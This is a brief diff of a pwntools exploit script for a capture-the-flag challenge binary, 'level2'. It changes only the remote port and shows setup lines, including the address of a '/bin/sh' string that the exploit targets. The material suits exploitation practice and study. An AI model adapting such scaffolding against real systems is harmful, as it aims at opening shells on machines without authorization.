@@ -1,7 +1,7 @@
 from pwn import *
 
 # p = process("./level2")
-p = remote("111.198.29.45" , 30290)
+p = remote("111.198.29.45" , 30878)
 elf = ELF("./level2")
 
 str_bin_sh = 0x0804A024 # hint # /bin/sh\x00
